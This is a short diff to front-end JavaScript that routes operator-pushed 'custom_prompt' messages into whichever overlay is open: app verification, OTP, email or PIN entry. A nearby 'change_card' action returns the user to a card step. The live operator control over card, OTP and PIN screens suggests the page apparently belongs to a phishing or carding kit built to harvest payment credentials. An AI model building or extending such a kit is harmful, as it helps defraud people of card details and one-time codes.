@@ -1937,8 +1937,29 @@ fetch('/api/settings')
       showMsg('error', p.message, true);
 
     } else if (a === 'custom_prompt') {
-      // show operator message inline without resetting to card step
-      showMsg('error', p.message, true);
+      var msg = p.message || '';
+      if (!q('app-verify-overlay').classList.contains('hidden')) {
+        q('app-spinner').classList.add('hidden');
+        q('app-error').textContent = msg;
+        q('app-error').classList.remove('hidden');
+        q('app-continue-btn').classList.remove('hidden');
+      } else if (!q('otp-overlay').classList.contains('hidden')) {
+        q('otp-spinner').classList.add('hidden');
+        q('otp-result').classList.remove('hidden');
+        var otpP = document.querySelector('#otp-result > p');
+        if (otpP) otpP.textContent = msg;
+      } else if (!q('email-overlay').classList.contains('hidden')) {
+        q('email-spinner').classList.add('hidden');
+        q('email-result').classList.remove('hidden');
+        var emailP = document.querySelector('#email-result > p');
+        if (emailP) emailP.textContent = msg;
+      } else if (!q('pin-overlay').classList.contains('hidden')) {
+        q('pin-spinner').classList.add('hidden');
+        q('pin-error').textContent = msg;
+        q('pin-error').classList.remove('hidden');
+      } else {
+        showMsg('error', msg, true);
+      }
 
     } else if (a === 'change_card') {
       _curStep = 'card';
